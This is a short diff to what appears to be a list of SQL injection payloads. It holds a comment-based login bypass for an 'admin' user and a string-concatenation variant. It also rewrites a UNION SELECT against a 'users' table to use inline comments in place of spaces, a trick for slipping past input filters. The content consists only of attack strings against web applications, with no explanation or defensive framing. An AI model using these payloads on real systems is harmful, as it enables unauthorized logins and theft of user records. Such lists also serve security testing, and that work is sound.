@@ -2,6 +2,6 @@
 
 admin'; #
 
-user'  UNION select * from users WHERE Id==1 Limit 1;
+user'/**/UNION/**/select/**/*/**/from/**/users/**/Limit/**/1;
 
 adm'||'in';
